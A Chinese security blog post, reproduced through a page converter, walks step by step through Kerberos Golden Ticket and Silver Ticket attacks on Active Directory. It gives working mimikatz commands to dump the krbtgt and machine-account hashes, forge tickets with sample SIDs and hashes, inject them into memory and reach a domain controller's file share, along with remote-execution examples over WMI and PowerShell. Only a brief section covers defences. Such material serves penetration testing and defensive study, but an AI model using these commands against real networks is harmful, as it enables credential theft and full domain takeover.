> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [shu1l.github.io](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/)

> 浅析黄金票据与白银票据

### [](#前言 "前言")前言

​ 票据传递攻击（PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用**黄金票据**和**白银票据**，通过 PtT 访问主机相当简单。

##### [](#概念 "概念")概念

我们首先需要学习关于 kerberos 认证

*   **KDC**(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS 和 TGS
*   **AS**(Authentication Server)： 身份认证服务
*   **TGS**(Ticket Granting Server)： 票据授予服务
*   **TGT**(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为 10 小时
*   **Pass The Ticket**： 如果我们能够拿到用户的 TGT，并将其导入到内存，就可以冒充该用户获得其访问权限

### [](#金票-GoldenTicket "(金票)GoldenTicket")(金票)GoldenTicket

#### [](#简介 "简介")简介

​ **Golden Ticket**（下面称为金票）是通过伪造的 TGT（TicketGranting Ticket），因为只要有了高权限的 TGT，那么就可以发送给 TGS 换取任意服务的 ST。可以说有了金票就有了域内的最高权限。

​ 每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来生成的，那么，我们如果拿到了 krbtgt 的密码 Hash，其实就可以伪造任意用户的 TICKET,

​ 对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出 krbtgt 的 Hash 值，，再通过 mimikatz 即可生成任意用户任何权限的 Ticket，也就是 Golden Ticket。

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/2016011804523676070160.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/2016011804523676070160.png "Alt text")

##### [](#黄金票据特点 "黄金票据特点")黄金票据特点

*   域控制器中的 KDC 服务不验证 TGT 中的用户帐户，直到 [TGT 超过 20 分钟，](http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html)这意味着攻击者可以使用禁用和删除的帐户，甚至是在 Active Directory 中不存在的虚拟帐户。
*   由于在域控制器上由 KDC 服务生成的域设置了 Kerberos 策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明 Kerberos 登录票据（TGT）只有 10 小时有效，如果票据声明有效期为 10 年，那么也会信任票据的有效性期为 10 年。
*   该 [KRBTGT](http://adsecurity.org/?p=483) 帐户密码[从不更改 *](http://adsecurity.org/?p=483) 和直到 KRBTGT 密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的 Golden Ticket 仍然存在。
*   它绕过了 SmartCard 身份验证要求，因为它绕过了 DC 在创建 TGT 之前执行的常规验证。
*   . 这个精心创建的 TGT 要求攻击者拥有 Active Directory 域的 KRBTGT 密码哈希值（[通常从域控制器转储](http://adsecurity.org/?p=451)）。
*   KRBTGT NTLM 哈希可用于生成一个有效的 TGT（使用 RC4）模拟任何用户访问 Active Directory 中的任何资源。
*   在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。
*   用于从 AD 森林中的 DC 获取有效的 TGS 票据，并提供一个坚持在一切域访问所有的主机的好办法。

##### [](#制作金票的条件： "制作金票的条件：")制作金票的条件：

```
1、域名称            
2、域的SID值
3、域的KRBTGT账户密码HASH
4、伪造用户名，可以是任意的
```

实战中，通常使用 Mimikatz 来提取 krbtgt 的 NTLM-Hash。

1. 获取域名称

```
net view /domain
```

2.Mimikatz 获取 krbtgt 的 HTLM-Hash 及域 SID

```
mimikatz "lsadump::dcsync /domain:test666.com /user:krbtgt"
```

3..Mimikatz 生成黄金票据

```
mimikatz "kerberos::golden /domain:test666.com /sid:S-1-5-21-1497092113-2272191533-193330055 /krbtgt:cac9c793eb3ba2c6abbcc9c14f18a41f /user:test666 /ticket:golden.kirbi"
```

#### [](#利用步骤 "利用步骤:")利用步骤:

##### [](#1-导出krbtgt的Hash "1.导出krbtgt的Hash")**1. 导出 krbtgt 的 Hash**

金票的生成需要用到 krbtgt 的密码 HASH 值，可以通过 mimikatz 中的

```
lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt
```

命令获取 krbtgt 的值。

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566542295163.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566542295163.png)

##### [](#2-生成Golden-Ticket "2.生成Golden Ticket")**2. 生成 Golden Ticket**

​ 得到 KRBTGT HASH 之后使用 mimikatz 中的 kerberos::golden 功能生成金票 golden.kiribi，即为伪造成功的 TGT。

参数说明：

```
/admin：伪造的用户名
/domain：域名称
/sid：SID值，注意是去掉最后一个-后面的值
/krbtgt：krbtgt的HASH值
/ticket：生成的票据名称
```

```
kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi
```

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566543225966.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566543225966.png)

##### [](#3-导入伪造Golden-Ticket获得域控权限 "3.  导入伪造Golden Ticket获得域控权限")**3. 导入伪造 Golden Ticket 获得域控权限**

通过 mimikatz 中的 kerberos::ptt 功能（Pass The Ticket）将 golden.kiribi 导入内存中。

```
kerberos::purge
kerberos::ppt golden.kiribi
kerberos::list
```

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566542805439.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566542805439.png)

此时就可以通过 dir 成功访问域控的共享文件夹。

```
dir \\OWA2010SP3.0day.org\c$
```

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566543260644.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566543260644.png)

**TIPS:**

​ 生成 Golden Ticket 不仅可以使用 aes256，也可用 krbtgt 的 NTLM hash  
可以用 **mimikatz “lsadump::lsa /patch”** 导出:

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1049983-20171227215506456-245748150.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1049983-20171227215506456-245748150.png "img")

##### [](#注意 "注意")注意

*   这种方式导入的 Ticket 默认在 20 分钟以内生效，如果过期了，再次 ptt 导入 Golden Ticket 即可。
*   可以伪造任意用户，即使其不存在。
*   krbtgt 的 NTLM hash 不会轻易改变，即使修改域控管理员密码。

#### [](#黄金票据防御 "黄金票据防御")黄金票据防御

*   **限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组**。这大大降低了攻击者访问域控制器的 Active Directory 的 ntds.dit。如果攻击者无法访问 AD 数据库（ntds.dit 文件），则无法获取到 KRBTGT 帐户密码。
*   **禁用 KRBTGT 帐户，并保存当前的密码以及以前的密码**。KRBTGT 密码哈希用于在 Kerberos 票据上签署 PAC 并对 TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则 DC（KDC）通过检查 KRBTGT 以前的密码来验证。

### [](#银票-SilverTickets "(银票)SilverTickets")(银票)SilverTickets

#### [](#简介-1 "简介")简介

​ Silver Tickets（下面称银票）就是伪造的 ST（Service Ticket），因为在 TGT 已经在 PAC 里限定了给 Client 授权的服务（通过 SID 的值），所以银票只能访问指定服务。

**正确的认证流程:**

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/20160118045254154911118.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/20160118045254154911118.png "Alt text")

**使用了 Silver Ticke 的认证流程:**

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/20160118045256924591213.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/20160118045256924591213.png "Alt text")

##### [](#白银票据的特点 "白银票据的特点")白银票据的特点

*   . 白银票据是一个有效的票据授予服务（TGS）Kerberos 票据，因为 Kerberos 验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。
*   黄金票据是伪造 TGT 并且有效的获得任何 Kerberos 服务，而白银票据是伪造 TGS。这意味着白银票据仅限于特定服务器上的任何服务。
*   大多数服务不验证 PAC（通过将 PAC 校验和发送到域控制器进行 PAC 验证），因此使用服务帐户密码哈希生成的有效 TGS 可以完全伪造 PAC
*   攻击者需要服务帐户密码哈希值
*   TGS 是伪造的，所以没有和 TGT 通信，意味着 DC 从验证过。
*   任何事件日志都在目标服务器上。

**制作银票的条件：**

```
1.域名称
2.域的SID值
3.域中的Server服务器账户的NTLM-Hash
4.伪造的用户名，可以是任意用户名.
5.目标服务器上面的kerberos服务
```

**白银票据的服务列表**

```
服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
```

#### [](#利用过程 "利用过程")利用过程

##### [](#1-获取hash-sid等信息 "1.获取hash sid等信息")1. 获取 hash sid 等信息

首先我们需要知道服务账户的密码 HASH，这里同样拿域控来举例，通过 mimikatz 查看当前域账号 administrator 的 HASH 值。注意，这里使用的不是 Administrator 账号的 HASH，而是 OWA2010SP3$ 的 HASH。

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > 1.txt
```

```
sekurlsa::logonpasswords
```

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566649973247.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566649973247.png)

##### [](#2-伪造白银票据 "2.伪造白银票据")2. 伪造白银票据

这时得到了 OWA2010SP3$ 的 HASH 值，通过 mimikatz 生成银票。

参数说明：

```
/domain：当前域名称
/sid：SID值，和金票一样取前面一部分
/target：目标主机，这里是OWA2010SP3.0day.org
/service：服务名称，这里需要访问共享文件，所以是cifs
/rc4：目标主机的HASH值
/user：伪造的用户名
/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
```

```
kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
```

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654188946.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654188946.png)

这时通过 klist 查看当前会话的 kerberos 票据可以看到生成的票据。

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654225879.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654225879.png)

使用`dir \\OWA2010SP3.0day.org\c$`访问 DC 的共享文件夹。

[![](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654265383.png)](https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566654265383.png)

#### [](#各种服务中的示例 "各种服务中的示例")各种服务中的示例

<table><thead><tr><th>Service Type</th><th>Service Silver Tickets</th></tr></thead><tbody><tr><td>WMI</td><td>HOST RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST HTTP</td></tr><tr><td>WinRM</td><td>HOST HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP operations includingMimikatz DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server Administration Tools</td><td>RPCSS LDAP CIFS</td></tr></tbody></table>

##### [](#Windows共享（CIFS）管理访问的银票 "Windows共享（CIFS）管理访问的银票")Windows 共享（CIFS）管理访问的银票

为 “cifs” 服务创建白银票据，以获得目标计算机上任何 Windows 共享的管理权限。

注入 CIFS Silver Ticket 后，我们现在可以访问目标计算机上的任何共享，包括

c $ 共享，我们能够将文件拷贝到共享文件中。

##### [](#具有管理员权限的Windows计算机（HOST）白银票据 "具有管理员权限的Windows计算机（HOST）白银票据")具有管理员权限的 Windows 计算机（HOST）白银票据

创建银票以获得目标计算机上所涵盖的任何 Windows 服务的管理员权限。这包括修改和创建计划任务的权限。

##### [](#Silver-Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行 "Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行")Silver Ticket 连接到以 Windows 管理员权限计算机上的 PowerShell 远程执行

为 “http” 服务和 “ wsman ” 服务创建 Silver Ticket，以获得目标系统上的 WinRM 和或 PowerShell Remoting 的管理权限。

注入两张 HTTP＆WSMAN 白银票据后，我们可以使用 PowerShell 远程（或 WinRM 的）反弹出目标系统 shell。首先 New-PSSession 使用 PowerShell 创建到远程系统的会话的 PowerShell cmdlet，然后 Enter-PSSession 打开远程 shell。

##### [](#白银票据证连接到具有管理员权限Windows计算机上的LDAP "白银票据证连接到具有管理员权限Windows计算机上的LDAP")白银票据证连接到具有管理员权限 Windows 计算机上的 LDAP

为 “ldap” 服务创建 Silver Ticket 以获得目标系统（包括 Active Directory）上 LDAP 服务的管理权限。

利用 LDAP Silver Ticket，我们可以远程访问 LDAP 服务来获得 krbtgt 的信息

**注：**

```
lsadump::dcsync
```

​ 向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。

##### [](#白银票据证连接到具有管理员权限Windows计算机上的WMI "白银票据证连接到具有管理员权限Windows计算机上的WMI")白银票据证连接到具有管理员权限 Windows 计算机上的 WMI

为 “HOST” 服务和 “ rpcss ” 服务创建白银票据以使用 WMI 在目标系统上远程执行命令。

注入这些白银票据之后，我们可以通过运行 “klist” 来确认 Kerberos TGS 票据在内存中注入白银票据后，我们可以通过 “传票” 来调用 WMIC 或 Invoke-WmiMethod 在目标系统上运行命令。

```
Invoke-WmiMethod win32_process -ComputerName $ Computer -Credential $ Creds -name create -argumentlist“$ RunCommand”
```

##### [](#访问域控上“cifs”服务实列 "访问域控上“cifs”服务实列")访问域控上 “cifs” 服务实列

首先需要获得如下信息：

```
domain
/sid
/target:目标服务器的域名全称，此处为域控的全称
/service：目标服务器上面的kerberos服务，此处为cifs
/rc4：计算机账户的NTLM hash，域控主机的计算机账户
/user：要伪造的用户名，此处可用silver测试
```

使用 mimikatz 执行如下命令导入 Silver Ticket

```
mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"
```

此时可以成功访问域控上的文件共享

#### [](#关于黄金票据和白银票据的一些区别 "关于黄金票据和白银票据的一些区别:")关于黄金票据和白银票据的一些区别:

##### [](#1-访问权限不同 "1.访问权限不同")1. 访问权限不同

*   Golden Ticket: 伪造 TGT, 可以获取任何 Kerberos 服务权限
*   Silver Ticket: 伪造 TGS, 只能访问指定的服务

**2. 加密方式不同**

*   Golden Ticket 由 Kerberos 的 Hash—> krbtgt 加密
*   Silver Ticket 由服务器端密码的 Hash 值—> master key 加密

##### [](#3-认证流程不同 "3.认证流程不同")3. 认证流程不同

*   Golden Ticket 的利用过程需要访问域控 (KDC)
*   Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器

#### [](#参考文章 "参考文章")参考文章

[[https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html]](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html])([https://wooyun.js.org/drops / 域渗透——Pass](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass) The Ticket.html)

[http://www.test666.me/archives/264/](http://www.test666.me/archives/264/)

[https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html](https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html)

[https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/](https://wh0ale.github.io/2018/12/25/2018-12-25-%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%A5%A8%E6%8D%AE/)

[http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/](http://sh1yan.top/2019/06/03/Discussion-on-Silver-Bill-and-Gold-Bill/)